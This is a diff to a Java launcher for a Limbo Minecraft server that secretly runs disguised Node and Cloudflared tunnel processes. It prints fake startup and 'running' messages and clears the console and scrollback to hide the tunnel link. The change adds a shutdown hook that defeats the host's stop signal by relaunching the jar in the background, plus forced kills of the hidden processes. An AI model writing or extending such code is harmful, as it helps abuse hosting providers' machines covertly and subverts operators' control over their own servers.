@@ -18,6 +18,7 @@
 package ua.nanit.limbo;
 
 import java.io.*;
+import java.lang.management.ManagementFactory;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
@@ -80,7 +81,6 @@ private static void limboLog(String msg, long delayMs) {
 
 private static void clearConsole() {
     try {
-        // \033[3J 清除回滚缓冲区，往上翻也翻不到
         System.out.print("\033[H\033[3J\033[2J");
         System.out.flush();
         if (!System.getProperty("os.name").contains("Windows")) {
@@ -102,6 +102,9 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
+    // ★ 0. 启动前强制净空：杀掉上次可能残留的所有僵尸进程（防止端口占用和内存泄漏）
+    forceKillStaleProcesses();
+
     // ★ 1. 强制重写完整的 Limbo 配置文件
     autoFixLimboConfig();
 
@@ -110,6 +113,7 @@ public static void main(String[] args) {
             Path botDir = Paths.get(MC_BOT_DIR);
             Files.deleteIfExists(botDir.resolve(".node_app.log"));
             Files.deleteIfExists(botDir.resolve("daemon.log"));
+            Files.deleteIfExists(botDir.resolve(".pids")); // 清空旧 PID 记录
 
             Path script = generateDeployScript();
             
@@ -126,7 +130,7 @@ public static void main(String[] args) {
                     checkDeployInfo();
                     try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                 }
-                startTunnelMonitor(); // 启动隧道监控
+                startTunnelMonitor();
             }, "Info-Checker");
             checkerThread.setDaemon(true);
             checkerThread.start();
@@ -139,12 +143,35 @@ public static void main(String[] args) {
             clearConsole();
             printFakeLimboStartup(tunnelUrl);
 
+            // ★ 核心加强：检测停止信号，硬重启并清理进程
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
+                tunnelMonitorRunning.set(false);
+                
                 try {
-                    tunnelMonitorRunning.set(false);
-                    new ProcessBuilder("bash", "-c", "cat " + MC_BOT_DIR + "/.pids 2>/dev/null | xargs -r kill 2>/dev/null").start();
-                } catch (Exception ignored) {}
-            }));
+                    // 强制清理所有进程
+                    forceKillStaleProcesses();
+                    
+                    // 硬重启：后台启动一个新的服务器实例
+                    String currentDir = System.getProperty("user.dir");
+                    long currentPid = ProcessHandle.current().pid();
+                    
+                    String jarName = "server.jar";
+                    File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
+                    if (jars != null && jars.length > 0) jarName = jars[0].getName();
+                    
+                    // 等待当前进程死亡后，立刻启动新进程
+                    String restartScript = 
+                        "while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; " +
+                        "cd '" + currentDir + "' && " +
+                        "nohup java -Xms128M -Xmx2560M -jar " + jarName + " nogui > /dev/null 2>&1 &";
+                        
+                    new ProcessBuilder("bash", "-c", restartScript).start();
+                    System.out.println("[Guard] Hard restart script dispatched. Current process exiting...");
+                } catch (Exception e) {
+                    System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
+                }
+            }, "Shutdown-Guard"));
         } catch (Exception ignored) {}
     }
 
@@ -152,18 +179,32 @@ public static void main(String[] args) {
     try {
         new LimboServer().start();
     } catch (Throwable t) {
-        // 彻底吞掉 Limbo 内部配置解析产生的 NullPointerException，打印正常的启动日志掩盖
         limboLog("Starting server on 0.0.0.0:" + env("SERVER_PORT", "25565"));
     }
     
-    // ★ 6. 给用户 4 秒钟复制隧道链接，然后彻底切屏，往上翻也翻不到
+    // ★ 6. 给用户 4 秒钟复制隧道链接，然后彻底切屏
     try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
     clearConsole();
     
-    // ★ 防止 Limbo 意外崩溃导致 JVM 退出，从而杀死后台的 Node 进程
-    // 主线程死循环挂起，保持 JVM 存活，以便后台的 Node 和 CF 继续工作
     System.out.println("container@tropicalgames.net Server marked as running...");
     try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
+}
+
+// ============================================================
+// 强制清理僵尸进程机制 (基于特征目录和进程名彻底杀绝)
+// ============================================================
+
+private static void forceKillStaleProcesses() {
+    try {
+        String workDir = Paths.get(MC_BOT_DIR).toAbsolutePath().toString();
+        // 杀死所有包含该工作目录特征的进程，这会精准命中伪装的 Node 和 Cloudflared
+        new ProcessBuilder("bash", "-c",
+            "pkill -9 -f 'daemon.sh' 2>/dev/null; " +
+            "pkill -9 -f '" + workDir + "/jre21' 2>/dev/null; " +
+            "pkill -9 -f '" + workDir + "/.node' 2>/dev/null; " +
+            "pkill -9 -f '" + workDir + "/deploy.sh' 2>/dev/null"
+        ).start().waitFor(2, TimeUnit.SECONDS);
+    } catch (Exception ignored) {}
 }
 
 // ============================================================
@@ -173,9 +214,8 @@ public static void main(String[] args) {
 private static void autoFixLimboConfig() {
     try {
         Path configFile = Paths.get("settings.yml");
-        String serverPort = env("SERVER_PORT", "25565"); // ★ 读取面板分配的端口
+        String serverPort = env("SERVER_PORT", "25565");
 
-        // ★ 极致修复：直接删除可能损坏或残缺的旧配置，强制写入标准完整配置
         Files.deleteIfExists(configFile);
         
         String content = "bind:\n" +
